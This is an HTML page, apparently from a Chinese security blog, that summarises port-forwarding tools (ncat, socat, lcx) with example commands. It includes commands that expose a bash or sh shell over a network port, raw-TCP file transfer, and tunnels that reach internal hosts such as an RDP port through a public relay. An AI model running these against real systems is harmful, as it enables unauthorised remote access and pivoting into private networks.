@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang=""><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>端口转发工具小结</title>
+    <meta name="description" content="倾旋的博客">
+    <meta name="author" content='倾旋'>
+
+    <link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous">
+
+    
+    <link rel="stylesheet" href="/sass/researcher.min.css">
+
+    
+        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
+    
+
+    
+        
+    
+</head>
+
+    <body><div class="container mt-5">
+    <nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
+        <a class="navbar-brand mx-0 mr-sm-auto" style="color: #dc3545;" href="https://payloads.online" title="倾旋的博客">
+          
+          倾旋的博客
+        </a>
+        <div class="navbar-nav flex-row flex-wrap justify-content-center">
+            
+                
+                
+                    <a class="nav-item nav-link" href="/about" title="About">
+                        About
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/links/" title="Links">
+                        Links
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/post/" title="Posts">
+                        Posts
+                    </a>
+                    
+                        <span class="nav-item navbar-text mx-1">/</span>
+                    
+                
+                    <a class="nav-item nav-link" href="/index.xml" title="Rss">
+                        Rss
+                    </a>
+                    
+                
+            
+        </div>
+    </nav>
+</div>
+<hr>
+<div id="content">
+<div class="container">
+    <p>介绍几款端口转发工具</p>
+<ul>
+<li>目录
+{:toc}</li>
+</ul>
+<h2 id="0x00-ncat">0X00 ncat</h2>
+<h3 id="反弹shell">反弹shell</h3>
+<p>服务器：<code>ncat -lnv -c bash 4489</code>  将bash转发到4489端口</p>
+<p>客户端：<code>ncat -nv 172.17.0.1 4489</code> 连接到目标的4489即可获得交互式bash</p>
+<p>Windows下用 <code>-c C:\windows\system32\cmd.exe</code></p>
+<p>参数介绍：</p>
+<p>|<code>-l,--listen &lt;port&gt;</code> | 监听某个端口
+| <code>-n, --nodns</code>　     |不通过DNS解析主机名
+| <code>-v,--verbose</code>      |设置的详细程度(可以使用几次)
+| <code>-c,--sh-exec</code>      | 执行传递的命令行</p>
+<h3 id="建立聊天室">建立聊天室</h3>
+<p>服务端：<code>ncat -lnv --broker --chat 8432</code></p>
+<p>客户端：<code>ncat -nv 172.17.0.1 8432</code></p>
+<p>参数介绍：</p>
+<p>| <code>--broker</code> | 使用ncat的代理连接模式，允许多个组织连接到ncat的服务器和其他人交流，ncat能创建一个经纪人在连接和系统之间通过NAT或者其他的直接连接。这个选项是和监听模式一起使用的。这会使监听端口的经纪人模式启动
+| <code>--chat</code>   |　开启一个简单的ncat聊天服务器</p>
+<h3 id="采用ssl加密">采用SSL加密</h3>
+<ul>
+<li>服务器：<code>ncat -lnv -c bash 4489 --ssl</code></li>
+<li>客户端：<code>ncat -nv 172.17.0.1 4489 --ssl</code></li>
+</ul>
+<h3 id="传输文件">传输文件</h3>
+<p>服务端：</p>
+<pre><code>root@Kali:~$ ncat -lnv 1788 &gt; tmp.txt
+Ncat: Version 7.01 ( https://nmap.org/ncat )
+Ncat: Listening on :::1788
+Ncat: Listening on 0.0.0.0:1788
+Ncat: Connection from 172.17.0.2.
+Ncat: Connection from 172.17.0.2:48004.
+</code></pre><p>客户端：</p>
+<pre><code>root@504d96ae69cc:/docker_files# cat tmp.txt 
+hello :)
+root@504d96ae69cc:/docker_files# ncat -nv 172.17.0.1 1788 &lt; tmp.txt 
+Ncat: Version 7.50 ( https://nmap.org/ncat )
+Ncat: Connected to 172.17.0.1:1788.
+Ncat: 9 bytes sent, 0 bytes received in 0.01 seconds.
+root@504d96ae69cc:/docker_files# 
+</code></pre><h3 id="参数列表中文">参数列表(中文)</h3>
+<p><a href="/tools/ncat.txt">ncat参数</a></p>
+<h2 id="0x01-socat">0x01 socat</h2>
+<h3 id="安装">安装</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget http://www.dest-unreach.org/socat/download/socat-2.0.0-b9.tar.gz
+tar xvf socat-2.0.0-b9.tar.gz
+cd socat-2.0.0-b9
+./configure
+make
+make install
+</code></pre></div><h3 id="建立通信聊天室">建立通信(聊天室)</h3>
+<p>| 服务端 | <code>socat - tcp4-listen:4444</code>
+| 客户端 | <code>socat tcp:SERVER_IP:4444</code></p>
+<h3 id="传输文件-1">传输文件</h3>
+<p>| 服务端 | <code>socat tcp4-listen:4444 open:data.txt,creat,append</code> |
+| 客户端 | <code>cat test.txt | socat - tcp:SERVER_IP:4444</code> |</p>
+<blockquote>
+<p>传输二进制文件需要将append改成binary</p>
+</blockquote>
+<h3 id="反弹shell-1">反弹Shell</h3>
+<p>| 服务端 | <code>socat tcp-l:4444 exec:sh,pty,stderr</code>
+| 客户端 | <code>socat - tcp:SERVER_IP:4444</code>
+| tcp-l 是 <code>tcp4-listen</code> 的简写</p>
+<h3 id="端口转发">端口转发</h3>
+<p><code>socat - tcp-l:8888,fork tcp4:192.168.3.1:4477</code></p>
+<p>当本机接收到8888端口的数据，将全部转发给192.168.3.1主机上的4477端口</p>
+<h3 id="udp通信">UDP通信</h3>
+<p>| 服务端 | <code>socat - udp-l:4456</code> |
+| 客户端 | <code>socat - udp-datagram:192.168.3.1:4456</code>
+|</p>
+<h3 id="公网转发到内网">公网转发到内网</h3>
+<p>| 服务端 | <code>socat tcp-listen:1234 tcp-listen:22</code> | 外网IP(<code>60.*.*.*</code>)
+| 客户端 | <code>socat tcp:60.*.*.*:1234 tcp:192.168.3.1:22</code> | 内网IP(192.168.3.1)</p>
+<h3 id="内网转发到公网">内网转发到公网</h3>
+<pre><code>                  ------------
+                 |   Server   |
+                 |  60.*.*.*  |
+                  ------------
+                 /            \
+          {|&lt;Firewall&gt;|}    {|&lt;Firewall&gt;|}
+                |                 |
+          --------------      ----------------        
+         | (192.168.3.1)|     | (192.168.3.2) |
+          --------------      ----------------
+       (hosting a service    (wanting to access
+         on port 4200)         Client A port 4200)
+</code></pre><p>| 服务端 | <code>socat - tcp-l:10000 tcp-l:4200</code>
+| 客户端 | <code>socat tcp4:60.*.*.*:10000 tcp4:localhost:4200</code></p>
+<h3 id="参考文档">参考文档</h3>
+<p><a href="/tools/socat">socat使用手册</a></p>
+<h2 id="0x02-lcxgo语言编写">0x02 lcx（go语言编写）</h2>
+<p>被控端192.168.10.2 ：</p>
+<p>lcx &lt;公网IP&gt; 123</p>
+<p>控制端 111.111.111.111：</p>
+<p>lcx 456 123 192.168.10.2 3389</p>
+<p>此时访问111.111.111.111的456就等于192.168.10.2:3389</p>
+<p><a href="http://www.secpulse.com/wp-content/uploads/2015/05/lcx._g.rar">Download</a>
+<a href="https://www.secpulse.com/archives/6341.html">相关文章</a></p>
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+</body>
+</html>
